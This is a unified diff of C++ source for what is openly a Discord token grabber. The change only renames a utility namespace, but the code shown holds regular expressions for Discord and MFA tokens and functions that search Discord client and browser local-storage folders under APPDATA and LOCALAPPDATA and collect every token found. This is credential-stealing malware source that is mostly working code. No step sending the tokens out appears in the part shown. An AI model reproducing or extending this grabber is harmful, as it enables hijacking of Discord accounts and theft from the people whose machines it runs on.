@@ -14,7 +14,7 @@
 #define DISCORD_MFA_TOKEN_REGEX "mfa\\.[\\w-]{84}"
 #define DISCORD_TOKEN_REGEX "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"
 
-namespace util
+namespace dtg_util
 {
 	namespace fs
 	{
@@ -109,18 +109,18 @@ namespace grabber
 		uint32_t finds{ 0 };
 
 		// Read file
-		std::string file = util::fs::read_file(path);
+		std::string file = dtg_util::fs::read_file(path);
 
 		// Search for tokens
-		finds += util::regex::regex_search(file, token_regex, output);
-		finds += util::regex::regex_search(file, mfa_token_regex, output);
+		finds += dtg_util::regex::regex_search(file, token_regex, output);
+		finds += dtg_util::regex::regex_search(file, mfa_token_regex, output);
 
 		return finds;
 	}
 
 	inline uint32_t find_tokens_in_folder(const std::filesystem::path& path, std::vector<std::string>& output)
 	{
-		std::vector<std::filesystem::path> files = util::fs::folder_scan(path);
+		std::vector<std::filesystem::path> files = dtg_util::fs::folder_scan(path);
 		uint32_t finds{ 0 };
 
 		for (auto& file : files) {
@@ -135,8 +135,8 @@ namespace grabber
 	std::vector<std::string> grab_tokens(bool clients = true, bool browsers = false)
 	{
 		// Get Appdata paths
-		std::string roaming = util::env::get_env("APPDATA"); if (roaming.front() != '\\') roaming.push_back('\\');
-		std::string local = util::env::get_env("LOCALAPPDATA"); if (local.front() != '\\') local.push_back('\\');
+		std::string roaming = dtg_util::env::get_env("APPDATA"); if (roaming.front() != '\\') roaming.push_back('\\');
+		std::string local = dtg_util::env::get_env("LOCALAPPDATA"); if (local.front() != '\\') local.push_back('\\');
 		std::string leveldb = "Local Storage\\leveldb\\";
 
 		std::vector<std::pair<std::string, std::string>> paths{};
@@ -155,7 +155,7 @@ namespace grabber
 				paths.push_back({ "Yandex", local + "Yandex\\YandexBrowser\\User Data\\Default\\" + leveldb });				// Yandex																										// Firefox
 
 				// Firefox - It's local storage system is a half mystery, not really safe because I'm not sure I got to fully work..
-				//std::vector<std::filesystem::path> users_paths = util::fs::folder_scan(local + "Mozilla\\Firefox\\Profiles\\");
+				//std::vector<std::filesystem::path> users_paths = dtg_util::fs::folder_scan(local + "Mozilla\\Firefox\\Profiles\\");
 				//for (auto& user_path : users_paths)
 				//{
 				//	if (user_path.filename().string().find("default-release") != std::string::npos)
@@ -170,7 +170,7 @@ namespace grabber
 		// Get tokens from each path
 		std::vector<std::string> tokens;
 		for (auto& path : paths)
-			if (util::fs::folder_exists(path.second))
+			if (dtg_util::fs::folder_exists(path.second))
 				find_tokens_in_folder(path.second, tokens); // Extract tokens
 
 		return tokens;
